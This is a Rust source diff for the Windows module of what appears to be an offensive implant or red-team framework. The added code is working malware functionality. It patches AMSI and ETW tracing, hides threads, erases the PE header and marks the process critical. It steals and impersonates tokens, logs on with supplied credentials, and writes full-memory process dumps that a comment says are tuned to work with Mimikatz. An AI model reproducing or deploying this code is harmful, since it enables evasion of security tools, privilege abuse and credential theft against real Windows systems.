@@ -15,17 +15,26 @@
 //
 
 #![no_implicit_prelude]
-#![cfg(windows)]
+#![cfg(target_family = "windows")]
+
+use core::alloc::Allocator;
+use core::str::from_utf8_unchecked;
 
 use crate::data::blob::Blob;
+use crate::data::str::{Fiber, MaybeString};
 use crate::data::time::Time;
-use crate::device::winapi::SessionHandle;
-use crate::device::{fs, winapi, Address, Login};
+use crate::device::winapi::{self, MinDumpOutput, SecurityQualityOfService, SessionHandle};
+use crate::device::{Address, Evasion, Login};
+use crate::env::{split_paths, var, var_os, PATH};
+use crate::fs::exists;
+use crate::io::{self, Error, ErrorKind, Write};
+use crate::path::PathBuf;
+use crate::prelude::*;
+use crate::process::Filter;
 use crate::util::crypt;
-use crate::util::stx::io::{self, Error};
-use crate::util::stx::prelude::*;
 
 pub const SHELL_ARGS: [u8; 2] = [b'/', b'c'];
+pub const SHELL_ARGS_ALT: [u8; 2] = [b'-', b'c'];
 
 const COM: [u16; 8] = [
     b'\\' as u16,
@@ -46,21 +55,50 @@ const COMSPEC: [u16; 7] = [
     b'e' as u16,
     b'c' as u16,
 ];
+
 #[inline]
-pub fn shell() -> String {
-    // NOTE(dij): I'm not 100% sure if this will be a saved constant or not, as
-    //            while yes, it makes one syscall (the 'exists' check, the rest
-    //            are ASM), it's pretty "quick" and dynamically resolves the shell
-    //            instead of only at runtime. Go saved it at runtime, however I
-    //            don't want to save many non-droppable (static) heap items.
+pub fn is_debugged() -> bool {
+    winapi::is_debugged()
+}
+#[inline]
+pub fn home_dir() -> Option<PathBuf> {
+    if let Ok(s) = var(crypt::get_or(0, "USERPROFILE")) {
+        return Some(s.into());
+    }
+    // 0x20008 - TOKEN_READ | TOKEN_QUERY
+    winapi::current_token(0x20008)
+        .and_then(winapi::GetUserProfileDirectory)
+        .map_or(None, |v| Some(v.into()))
+}
+#[inline]
+pub fn revert_to_self() -> io::Result<()> {
+    winapi::RevertToSelf().map_err(Error::from)
+}
+#[inline]
+pub fn evade(flags: Evasion) -> io::Result<()> {
+    if flags & Evasion::WIN_PATCH_AMSI != 0 {
+        winapi::patch_asmi()?;
+    }
+    if flags & Evasion::WIN_PATCH_TRACE != 0 {
+        winapi::patch_tracing()?;
+    }
+    if flags & Evasion::WIN_HIDE_THREADS != 0 {
+        winapi::hide_thread(winapi::CURRENT_THREAD)?;
+    }
+    if flags & Evasion::ERASE_HEADER != 0 {
+        winapi::erase_pe_header()?;
+    }
+    Ok(())
+}
+pub fn shell_in<A: Allocator>(alloc: A) -> Fiber<A> {
     if let Some(p) = winapi::GetEnvironment()
         .iter()
         .find(|v| v.is_key(&COMSPEC))
         .and_then(|d| d.value_as_blob())
         .map(|v| v.to_string())
     {
-        if fs::exists(&p) {
-            return p;
+        if exists(&p) {
+            return p.into_alloc(alloc);
         }
     }
     winapi::system_dir()
@@ -68,32 +106,80 @@ pub fn shell() -> String {
         .chain(COM.iter())
         .map(|v| *v as u8)
         .collect::<Blob<u8, 256>>()
-        .to_string()
+        .into_alloc(alloc)
 }
 #[inline]
-pub fn powershell<'a>() -> &'a str {
-    crypt::get_or(0, "powershell.exe")
+pub fn set_critical(is_critical: bool) -> io::Result<bool> {
+    winapi::acquire_debug();
+    let r = winapi::RtlSetProcessIsCritical(is_critical).map_err(Error::from);
+    winapi::release_debug();
+    r
+}
+pub fn powershell_in<A: Allocator>(alloc: A) -> Option<Fiber<A>> {
+    let b = crypt::get_or(0, "powershell.exe");
+    for i in split_paths(&var_os(unsafe { from_utf8_unchecked(&PATH) })?) {
+        let r = i.join(b);
+        if exists(&r) {
+            return Some(r.to_string_lossy().into_alloc(alloc));
+        }
+    }
+    None
 }
 #[inline]
-pub fn whoami() -> io::Result<String> {
-    winapi::local_user().map_err(Error::from)
+pub fn whoami_in<A: Allocator>(alloc: A) -> io::Result<Fiber<A>> {
+    match winapi::local_user() {
+        Err(e) => Err(Error::from(e)),
+        Ok(v) => Ok(v.into_alloc(alloc)),
+    }
 }
 #[inline]
-pub fn hostname() -> io::Result<String> {
-    let n = winapi::GetComputerName().map_err(Error::from)?;
+pub fn set_process_name(_cmd: impl AsRef<str>) -> io::Result<bool> {
+    // TODO(dij): Due to how rust handles the args, we can't easily
+    //            grab a pointer to it to change it. Maybe in the future??.
+    Err(ErrorKind::Unsupported.into())
+}
+#[inline]
+pub fn hostname_in<A: Allocator>(alloc: A) -> io::Result<Fiber<A>> {
+    let n = winapi::GetComputerName()?;
     if let Some(i) = n.as_bytes().iter().position(|v| *v == b'.') {
-        Ok(n[0..i].to_string())
+        Ok((&n[0..i]).into_alloc(alloc))
     } else {
-        Ok(n)
+        Ok(n.into_alloc(alloc))
     }
 }
-pub fn logins() -> io::Result<Vec<Login>> {
-    let h = SessionHandle::default();
-    let s = winapi::WTSGetSessions(&h).map_err(Error::from)?;
-    if s.len() == 0 {
-        return Ok(Vec::new());
+pub fn impersonate<A: Allocator>(proc: &Filter<A>) -> io::Result<()> {
+    if impersonate_thread(proc).is_ok() {
+        return Ok(());
     }
-    let mut o = Vec::with_capacity(s.len());
+    // 0x2000F - TOKEN_READ (STANDARD_RIGHTS_READ | TOKEN_QUERY) |
+    //            TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE
+    //
+    // NOTE(dij): Might need to change this to "0x200EF" which adds "TOKEN_WRITE"
+    //            access. Also not sure if we need "TOKEN_IMPERSONATE" or
+    //            "TOKEN_ASSIGN_PRIMARY" as we're duplicating it.
+    //
+    // 0x2000000 - MAXIMUM_ALLOWED
+    // 0x2       - SecurityImpersonation
+    // 0x2       - TokenImpersonation
+    winapi::SetThreadToken(
+        winapi::CURRENT_THREAD,
+        winapi::DuplicateTokenEx(proc.token_func(0x2000F, None)?, 0x2000000, None, 2, 2)?,
+    )
+    .map_err(Error::from)
+}
+#[inline]
+pub fn impersonate_thread<A: Allocator>(proc: &Filter<A>) -> io::Result<()> {
+    // 0x0200 - THREAD_DIRECT_IMPERSONATION
+    let i = SecurityQualityOfService::level(2);
+    winapi::NtImpersonateThread(winapi::CURRENT_THREAD, proc.thread_func(0x200, None)?, &i).map_err(Error::from)
+}
+pub fn logins_in<A: Allocator + Clone>(alloc: A) -> io::Result<Vec<Login<A>, A>> {
+    let h = SessionHandle::default();
+    let s = winapi::WTSGetSessions(&h)?;
+    if s.is_empty() {
+        return Ok(Vec::new_in(alloc));
+    }
+    let mut o = Vec::with_capacity_in(s.len(), alloc.clone());
     for i in s {
         if i.status >= 6 && i.status <= 9 {
             continue;
@@ -102,353 +188,126 @@ pub fn logins() -> io::Result<Vec<Login>> {
             id:         i.id,
             from:       Address::from(i.addr),
             user:       if i.domain.is_empty() {
-                i.user
+                i.user.into_alloc(alloc.clone())
             } else {
-                let mut t = i.domain.clone();
+                let mut t = i.domain.into_alloc(alloc.clone());
                 t.push('\\');
                 t.push_str(&i.user);
                 t
             },
-            host:       i.host,
+            host:       i.host.into_alloc(alloc.clone()),
             status:     i.status,
             last_input: Time::from(i.last_input),
             login_time: Time::from(i.login_time),
         });
     }
+    o.sort();
     Ok(o)
 }
-pub fn mounts() -> io::Result<Vec<String>> {
-    let d = winapi::GetLogicalDrives().map_err(Error::from)?;
-    let mut o = Vec::new();
+pub fn mounts_in<A: Allocator + Clone>(alloc: A) -> io::Result<Vec<Fiber<A>, A>> {
+    let d = winapi::GetLogicalDrives()?;
+    let mut o = Vec::new_in(alloc.clone());
     o.reserve_exact(26);
     for i in 0..26 {
         if (d & (1 << i)) == 0 {
             continue;
         }
-        let mut b = String::new();
+        let mut b = Fiber::new_in(alloc.clone());
         let t = unsafe { b.as_mut_vec() };
         t.push(b'A' + i);
         t.extend_from_slice(&[b':', b'\\']);
         o.push(b);
     }
+    o.sort();
     Ok(o)
 }
-#[inline]
-pub fn set_critical(is_critical: bool) -> io::Result<bool> {
-    winapi::acquire_privilege(winapi::SE_DEBUG_PRIVILEGE).map_err(Error::from)?;
-    winapi::RtlSetProcessIsCritical(is_critical).map_err(Error::from)
+pub fn dump_process<A: Allocator>(proc: &Filter<A>, w: &mut impl Write) -> io::Result<usize> {
+    if !winapi::is_min_windows_vista() {
+        // TODO(dij): We could bypass this restriction using a File of Pipe, but
+        //            the File option would be an OpSec issue and I don't to force
+        //            make that choice for the user. Pipe doesn't seem to be
+        //            accepted by the function as a Handle either.
+        return Err(ErrorKind::Unsupported.into());
+    }
+    // 0x450 - PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE
+    let h = proc.handle_func(0x450, None)?;
+    winapi::acquire_debug();
+    let p = winapi::GetProcessID(&h)?;
+    if p == winapi::GetCurrentProcessID() {
+        winapi::release_debug();
+        return Err(ErrorKind::ConnectionRefused.into());
+    }
+    // MiniDump Flags (MINIDUMP_TYPE)
+    //
+    //      0x2 | MiniDumpWithFullMemory
+    //      0x4 | MiniDumpWithHandleData
+    // ======== | [ Windows XP Support Ends Here ]
+    //     0x20 | MiniDumpWithUnloadedModules
+    // ======== | [ Windows XP SP2 / Server 2003 Support Ends Here ]
+    //    0x800 | MiniDumpWithFullMemoryInfo
+    //   0x1000 | MiniDumpWithThreadInfo
+    // ======== | [ Windows 7 Support Ends Here ]
+    //  0x20000 | MiniDumpIgnoreInaccessibleMemory
+    // ======== | [ We Stop Here ]
+    // 0x400000 | MiniDumpWithIptTrace
+    // ======== | [ ^ Not Needed ]
+    // -------- |
+    // 0x421826 | Total Flags for a Standard MiniDump on Win10.
+    //
+    // NOTE(dij): Divergence from Golang. This function will change the flags
+    //            based on the underlying OS version support to potentially
+    //            gather more data.
+    let f = if winapi::is_windows_xp() {
+        0x6 // MiniDumpWithFullMemory | MiniDumpWithHandleData
+            // This is enough for WinXp/Server 2003 for it to work with
+            // Mimikatz.
+    } else if winapi::is_min_windows_8() {
+        0x21826
+        // MiniDumpWithFullMemory | MiniDumpWithHandleData |
+        // MiniDumpWithUnloadedModules | MiniDumpWithFullMemoryInfo |
+        // MiniDumpWithThreadInfo | MiniDumpIgnoreInaccessibleMemory
+    } else {
+        0x1826
+        // MiniDumpWithFullMemory | MiniDumpWithHandleData |
+        // MiniDumpWithUnloadedModules | MiniDumpWithFullMemoryInfo |
+        // MiniDumpWithThreadInfo
+    };
+    let r = winapi::MiniDumpWriteDump(h, p, f, MinDumpOutput::Writer(w));
+    winapi::release_debug(); // Release Debug First.
+    r.map_err(Error::from)
 }
-
-pub mod env {
-    use alloc::vec::IntoIter;
-    use core::error::Error;
-    use core::fmt::{self, Debug, Display, Formatter};
-
-    use crate::device::winapi;
-    use crate::util::crypt;
-    use crate::util::stx::ffi::{OsStr, OsString, PathBuf};
-    use crate::util::stx::io;
-    use crate::util::stx::prelude::*;
-
-    pub struct VarError;
-    pub struct Args(ArgsOs);
-    pub struct Vars(VarsOs);
-    pub struct JoinPathsError;
-
-    pub type ArgsOs = IntoIter<OsString>;
-    pub type SplitPaths = IntoIter<PathBuf>;
-    pub type VarsOs = IntoIter<(OsString, OsString)>;
-
-    impl Error for VarError {
-        #[inline]
-        fn cause(&self) -> Option<&dyn Error> {
-            None
-        }
-        #[inline]
-        fn source(&self) -> Option<&(dyn Error + 'static)> {
-            None
-        }
-    }
-    impl Debug for VarError {
-        #[inline]
-        fn fmt(&self, f: &mut Formatter<'_>) -> fmt::Result {
-            Display::fmt(self, f)
-        }
-    }
-    impl Display for VarError {
-        #[inline]
-        fn fmt(&self, f: &mut Formatter<'_>) -> fmt::Result {
-            f.write_str(if cfg!(feature = "implant") {
-                "0x404"
-            } else {
-                "var not present"
-            })
-        }
-    }
-
-    impl Error for JoinPathsError {
-        #[inline]
-        fn cause(&self) -> Option<&dyn Error> {
-            None
-        }
-        #[inline]
-        fn source(&self) -> Option<&(dyn Error + 'static)> {
-            None
-        }
-    }
-    impl Debug for JoinPathsError {
-        #[inline]
-        fn fmt(&self, f: &mut Formatter<'_>) -> fmt::Result {
-            Display::fmt(self, f)
-        }
-    }
-    impl Display for JoinPathsError {
-        #[inline]
-        fn fmt(&self, f: &mut Formatter<'_>) -> fmt::Result {
-            f.write_str(if cfg!(feature = "implant") {
-                "0x400"
-            } else {
-                "bad path value"
-            })
-        }
-    }
-
-    impl Iterator for Args {
-        type Item = String;
-
-        #[inline]
-        fn next(&mut self) -> Option<String> {
-            self.0.next().map(|v| v.to_string_lossy().to_string())
-        }
-        #[inline]
-        fn size_hint(&self) -> (usize, Option<usize>) {
-            self.0.size_hint()
-        }
-    }
-    impl ExactSizeIterator for Args {
-        #[inline]
-        fn len(&self) -> usize {
-            self.0.len()
-        }
-    }
-
-    impl Iterator for Vars {
-        type Item = (String, String);
-
-        #[inline]
-        fn size_hint(&self) -> (usize, Option<usize>) {
-            self.0.size_hint()
-        }
-        #[inline]
-        fn next(&mut self) -> Option<(String, String)> {
-            self.0.next().map(|(a, b)| {
-                (
-                    a.to_string_lossy().to_string(),
-                    b.to_string_lossy().to_string(),
-                )
-            })
-        }
-    }
-    impl ExactSizeIterator for Vars {
-        #[inline]
-        fn len(&self) -> usize {
-            self.0.len()
-        }
-    }
-
-    #[inline]
-    pub fn args() -> Args {
-        Args(args_os())
-    }
-    #[inline]
-    pub fn vars() -> Vars {
-        Vars(vars_os())
-    }
-    #[inline]
-    pub fn args_os() -> ArgsOs {
-        split_args(&winapi::GetCommandLine()).into_iter()
-    }
-    #[inline]
-    pub fn vars_os() -> VarsOs {
-        winapi::GetEnvironment().entries().into_iter()
-    }
-    #[inline]
-    pub fn temp_dir() -> PathBuf {
-        winapi::GetTempPath()
-            .unwrap_or_else(|_| var(crypt::get_or(0, "TEMP")).unwrap_or_default())
-            .into()
-    }
-    #[inline]
-    pub fn home_dir() -> Option<PathBuf> {
-        if let Ok(s) = var(crypt::get_or(0, "USERPROFILE")) {
-            return Some(s.into());
-        }
-        // 0x20008 - TOKEN_READ | TOKEN_QUERY
-        winapi::current_token(0x20008)
-            .and_then(|t| winapi::GetUserProfileDirectory(t))
-            .map_or(None, |v| Some(v.into()))
-    }
-    #[inline]
-    pub fn remove_var(key: impl AsRef<OsStr>) {
-        // IGNORE ERROR
-        let _ = winapi::SetEnvironmentVariable(key.as_ref().to_string_lossy(), None);
-    }
-    #[inline]
-    pub fn current_dir() -> io::Result<PathBuf> {
-        Ok(winapi::GetCurrentDirectory().into())
-    }
-    #[inline]
-    pub fn current_exe() -> io::Result<PathBuf> {
-        winapi::GetModuleFileName(winapi::INVALID)
-            .map(|v| v.into())
-            .map_err(io::Error::from)
-    }
-    pub fn split_args(a: &str) -> Vec<OsString> {
-        let mut o = Vec::new();
-        let (mut l, mut d, mut s) = (0, false, false);
-        let b = a.as_bytes();
-        for (i, x) in b.iter().enumerate() {
-            match *x {
-                b'"' if i > 0 && backup(b, i) => (),
-                b'"' if !s && i > 0 && b[i - 1] == b'\\' && !backup(b, i) => d = !d,
-                b'"' if i + 1 < b.len() && b[i + 1] == b'"' => (),
-                b'"' if !d && !s => d = true,
-                b'"' if d && !s => d = false,
-                b'\'' if !s && !d => s = true,
-                b'\'' if s && !d => s = false,
-                b' ' if d => (),
-                b' ' => {
-                    if i - l > 0 {
-                        o.push(collapse(&b[l..i]))
-                    }
-                    l = i + 1;
-                },
-                _ => (),
-            }
-        }
-        if l == 0 {
-            o.push(collapse(b));
-        } else if l < b.len() {
-            o.push(collapse(&b[l..]));
-        }
-        o
-    }
-    #[inline]
-    pub fn var_os(key: impl AsRef<OsStr>) -> Option<OsString> {
-        winapi::GetEnvironmentVariable(key.as_ref().to_string_lossy()).and_then(|v| Some(v.into()))
-    }
-    #[inline]
-    pub fn var(key: impl AsRef<OsStr>) -> Result<String, VarError> {
-        winapi::GetEnvironmentVariable(key.as_ref().to_string_lossy()).map_or(Err(VarError), |v| Ok(v))
-    }
-    #[inline]
-    pub fn set_var(key: impl AsRef<OsStr>, value: impl AsRef<OsStr>) {
-        // IGNORE ERROR
-        let _ = winapi::SetEnvironmentVariable(
-            key.as_ref().to_string_lossy(),
-            value.as_ref().to_string_lossy(),
-        );
-    }
-    #[inline]
-    pub fn set_current_dir(path: impl AsRef<OsStr>) -> io::Result<()> {
-        winapi::SetCurrentDirectory(&path.as_ref().to_string_lossy()).map_err(io::Error::from)
-    }
-    pub fn split_paths<T: AsRef<OsStr> + ?Sized>(paths: &T) -> SplitPaths {
-        let v = &*paths.as_ref().to_string_lossy();
-        let (mut o, mut l, mut d) = (Vec::new(), 0, false);
-        for (i, x) in v.as_bytes().iter().enumerate() {
-            match *x {
-                b'"' if !d => d = true,
-                b'"' => d = false,
-                b';' if d => (),
-                b';' => {
-                    if i - l > 0 {
-                        o.push(PathBuf::from(&v[l..i]))
-                    }
-                    l = i + 1;
-                },
-                _ => (),
-            }
-        }
-        if l == 0 {
-            o.push(v.into());
-        } else if l < v.len() {
-            o.push(PathBuf::from(&v[l..]));
-        }
-        o.into_iter()
-    }
-    pub fn join_paths<T: AsRef<OsStr>>(paths: impl IntoIterator<Item = T>) -> Result<OsString, JoinPathsError> {
-        let mut b = String::new();
-        for (i, v) in paths.into_iter().enumerate() {
-            let d = v.as_ref().to_string_lossy();
-            if d.contains('"') {
-                return Err(JoinPathsError);
-            }
-            if i > 0 {
-                b.push(';');
-            }
-            b.reserve(d.len() + 1);
-            if !d.contains(';') {
-                b.push_str(&*d);
-                continue;
-            }
-            b.push('"');
-            b.push_str(&*d);
-            b.push('"');
-        }
-        Ok(b.into())
-    }
-
-    fn collapse(v: &[u8]) -> OsString {
-        let mut c = 0;
-        let mut b = String::with_capacity(v.len());
-        let x = unsafe { b.as_mut_vec() };
-        for (i, t) in v.iter().enumerate() {
-            match *t {
-                b'"' if i > 0 && v[i - 1] == b'\\' => {
-                    if c > 1 {
-                        for _ in 0..(c / 2) {
-                            x.push(b'\\');
-                        }
-                    }
-                    if c == 1 || c % 2 == 1 {
-                        x.push(b'"');
-                    }
-                    c = 0;
-                },
-                b'"' if i > 0 && v[i - 1] == b'"' => (),
-                b'"' if i + 1 == v.len() || v[i + 1] != b'"' => (),
-                b'\\' => c += 1,
-                _ => {
-                    if c > 0 {
-                        for _ in 0..c {
-                            x.push(b'\\');
-                        }
-                        c = 0;
-                    }
-                    x.push(*t);
-                },
-            }
-        }
-        if c > 0 {
-            b.extend((0..c).map(|_| '\\'));
-        }
-        b.into()
-    }
-    fn backup(buf: &[u8], pos: usize) -> bool {
-        if buf[pos - 1] != b'\\' {
-            return false;
-        }
-        if pos <= 2 {
-            return true;
-        }
-        let mut c = 0;
-        for i in (0..pos - 2).rev() {
-            if buf[i] != b'\\' {
-                break;
-            }
-            c += 1;
-        }
-        c == 0 || c % 2 == 1
-    }
+#[inline]
+pub fn impersonate_user<U: AsRef<str>, M: MaybeString>(user: U, domain: M, pass: M) -> io::Result<()> {
+    // 0x2       - LOGON32_LOGON_INTERACTIVE
+    // 0x2000000 - MAXIMUM_ALLOWED
+    // 0x2       - SecurityImpersonation
+    winapi::SetThreadToken(
+        winapi::CURRENT_THREAD,
+        winapi::DuplicateTokenEx(
+            winapi::LoginUser(user, domain, pass, 0x2, 0)?,
+            0x2000000,
+            None,
+            2,
+            2,
+        )?,
+    )
+    .map_err(Error::from)
+}
+#[inline]
+pub fn impersonate_user_network<U: AsRef<str>, M: MaybeString>(user: U, domain: M, pass: M) -> io::Result<()> {
+    // 0x9       - LOGON32_LOGON_NEW_CREDENTIALS
+    // 0x3       - LOGON32_PROVIDER_WINNT50
+    // 0x2000000 - MAXIMUM_ALLOWED
+    // 0x2       - SecurityImpersonation
+    winapi::SetThreadToken(
+        winapi::CURRENT_THREAD,
+        winapi::DuplicateTokenEx(
+            winapi::LoginUser(user, domain, pass, 0x9, 0x3)?,
+            0x2000000,
+            None,
+            2,
+            2,
+        )?,
+    )
+    .map_err(Error::from)
 }
